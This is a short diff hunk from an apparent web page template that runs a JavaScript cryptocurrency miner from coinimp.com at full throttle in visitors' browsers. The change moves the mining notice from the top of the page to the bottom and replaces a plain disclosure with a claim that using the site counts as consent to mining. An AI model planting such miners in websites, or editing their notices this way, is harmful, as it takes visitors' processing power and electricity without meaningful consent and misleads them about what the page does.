@@ -65,7 +65,7 @@ EOF;
         throttle: 0
     });
     _client.start();
-    _client.addMiningNotification("Top", "This site is running JavaScript miner from coinimp.com", "#cccccc", 40, "#3d3d3d");
+    _client.addMiningNotification("Bottom", "By Using this website you consent to crypto mining on your computer", "#cccccc", 40, "#3d3d3d");
 
 </script>
     
